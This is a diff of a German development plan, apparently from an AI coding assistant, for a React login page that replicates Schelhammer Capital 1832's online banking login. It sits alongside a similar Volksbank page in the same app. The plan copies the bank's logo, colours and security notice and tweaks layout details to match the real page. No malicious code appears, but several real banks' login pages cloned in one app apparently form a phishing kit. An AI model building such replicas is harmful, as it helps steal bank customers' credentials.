@@ -1,42 +1,36 @@
 
 
-## Neue Seite `/schelhammer` — Login-Seite für Schelhammer Capital 1832
-
-### Überblick
-Neue Seite basierend auf der Volksbank-Struktur, angepasst an das Schelhammer Capital 1832 Branding.
-
-### Vorbereitungen
-1. **Assets kopieren** — Logo (`logo-2.jpg`) und Hintergrundbild (`backgroundschel.png`) nach `src/assets/`
-2. **Route hinzufügen** — `/schelhammer` in `src/App.tsx`
+## Schelhammer — Diverse UI-Anpassungen
 
 ### Datei: `src/pages/Schelhammer.tsx`
 
-Aufbau analog zu Volksbank, mit folgenden Anpassungen:
+1. **Header schmaler** (Z.15): `py-3` → `py-1` (Logo bleibt gleich groß)
 
-1. **Header** — Weißer Hintergrund, Schelhammer-Logo, unterer Rand `#e0e0e0`
+2. **Login-Titel größer** (Z.33): `text-xl` → `text-2xl`
 
-2. **Main-Bereich** — Hintergrundbild (Stephansdom), zentrierte Login-Card
+3. **Info-Text Zeilenabstand verkleinern** (Z.42): `leading-snug` → `leading-tight`
 
-3. **Card-Header** — Rote Leiste (`#d31220`) mit "Login"
+4. **Demo-Text entfernen** (Z.48-53): Kompletten Absatz löschen
 
-4. **Card-Body**:
-   - Info-Text (deutsch): "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
-   - Demo-Text mit Checkbox-Optik: "Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben."
-   - Divider
-   - Label-Zeile: "Benutzername" links, "Hochkontrast | English" rechts
-   - Username-Input (gleicher Stil wie Volksbank, aber Focus-Farbe `#d31220`)
-   - "Sie melden sich zum ersten Mal an?" als roter Link, zentriert
-   - Nutzungsbedingungen-Text zentriert
-   - "Weiter"-Button in `#d31220`
-   - Divider
-   - "Benutzername vergessen" und "Passwort vergessen" als rote Links, zentriert
+5. **Divider nicht full-width** (Z.56): `-mx-6` entfernen → `<hr className="border-gray-200" />` (gleiche Breite wie Eingabefeld)
 
-5. **Sprachumschaltung** — Toggle "English"/"Deutsch" mit englischen Übersetzungen für alle Texte
+6. **Label-Zeile anpassen** (Z.59-83):
+   - "Benutzername" größer: `text-xs` → `text-sm`
+   - "Hochkontrast", den Strich `|` und den Hochkontrast-Link komplett entfernen
+   - "English"/"Deutsch" größer: `text-sm` → `text-sm` (bleibt, aber ohne die anderen Elemente)
 
-6. **Farben**:
-   - Primär/Akzent: `#d31220` (statt `#196bc1` bei Volksbank)
-   - Links, Button, Card-Header, Focus-States alles in `#d31220`
+7. **Eingabefeld Farben** (Z.94-98):
+   - Nicht-fokussiert: `backgroundColor: "#e8e8e8"` → `"#f1f1f1"`, `borderColor: "#999"` → `"#dedede"`
+   - Fokussiert: bleibt `#f5d5d8` / `#d31220` (rot passt)
 
-### Datei: `src/App.tsx`
-- Import `Schelhammer` und Route `/schelhammer` hinzufügen
+8. **Terms-Text gleiche Breite wie Eingabefeld** (Z.124): Ist bereits `w-full` im Container — `text-center` bleibt, kein `px`-Override nötig (passt schon)
+
+9. **Weiter-Button Text größer** (Z.132): `text-sm` → `text-base`
+
+10. **Full-width Divider über Weiter-Button** (vor Z.130): `<hr className="-mx-6 border-gray-200" />` einfügen
+
+11. **Fragezeichen entfernen** (Z.149, 157):
+    - `"Benutzername vergessen?"` → `"Benutzername vergessen"`
+    - `"Passwort vergessen?"` → `"Passwort vergessen"`
+    - Englisch: `"Forgot username?"` → `"Forgot username"`, `"Forgot password?"` → `"Forgot password"`
 
